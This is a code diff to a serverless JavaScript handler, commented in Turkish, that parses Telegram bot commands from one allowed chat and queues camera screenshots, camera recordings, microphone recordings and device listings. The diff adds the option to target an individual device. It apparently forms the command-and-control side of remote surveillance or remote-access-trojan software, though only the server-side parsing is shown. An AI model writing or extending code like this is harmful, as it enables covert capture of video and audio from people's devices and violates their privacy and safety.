@@ -56,30 +56,48 @@ export default async function handler(req, res) {
 
                 // Sadece izin verilen chat ID'den gelen komutları kabul et
                 if (chatId === allowedChatId) {
-                    // Komut kontrolü
-                    if (text === '/camss') {
+                    // /devices komutu - özel işlem
+                    if (text === '/devices') {
+                        commands.push({
+                            command: 'list_devices',
+                            params: null,
+                            message_id: update.message.message_id,
+                            target_device: null // Tüm cihazlar
+                        });
+                    }
+                    // /camss veya /camss 2 formatı
+                    else if (text.startsWith('/camss')) {
+                        const match = text.match(/\/camss\s*(\d+)?/);
+                        const targetDevice = match && match[1] ? parseInt(match[1]) : null;
                         commands.push({
                             command: 'camera_screenshot',
                             params: null,
-                            message_id: update.message.message_id
+                            message_id: update.message.message_id,
+                            target_device: targetDevice // null = tüm cihazlar
                         });
-                    } else if (text.startsWith('/camrec')) {
-                        // /camrec35, /camrec 35 veya /camrec (default 5) - Min 1s, Max 30s
-                        const match = text.match(/\/camrec\s*(\d+)?/);
+                    }
+                    // /camrec35 veya /camrec35 2 formatı
+                    else if (text.startsWith('/camrec')) {
+                        const match = text.match(/\/camrec\s*(\d+)?\s*(\d+)?/);
                         const duration = match && match[1] ? parseInt(match[1]) : 5;
+                        const targetDevice = match && match[2] ? parseInt(match[2]) : null;
                         commands.push({
                             command: 'camera_record',
-                            params: { duration: Math.max(1, Math.min(duration, 30)) }, // Min 1, Max 30 saniye
-                            message_id: update.message.message_id
+                            params: { duration: Math.max(1, Math.min(duration, 30)) },
+                            message_id: update.message.message_id,
+                            target_device: targetDevice
                         });
-                    } else if (text.startsWith('/micrec')) {
-                        // /micrec35, /micrec 35 veya /micrec (default 5) - Min 1s, Max 30s
-                        const match = text.match(/\/micrec\s*(\d+)?/);
+                    }
+                    // /micrec35 veya /micrec35 2 formatı
+                    else if (text.startsWith('/micrec')) {
+                        const match = text.match(/\/micrec\s*(\d+)?\s*(\d+)?/);
                         const duration = match && match[1] ? parseInt(match[1]) : 5;
+                        const targetDevice = match && match[2] ? parseInt(match[2]) : null;
                         commands.push({
                             command: 'microphone_record',
-                            params: { duration: Math.max(1, Math.min(duration, 30)) }, // Min 1, Max 30 saniye
-                            message_id: update.message.message_id
+                            params: { duration: Math.max(1, Math.min(duration, 30)) },
+                            message_id: update.message.message_id,
+                            target_device: targetDevice
                         });
                     }
                 }
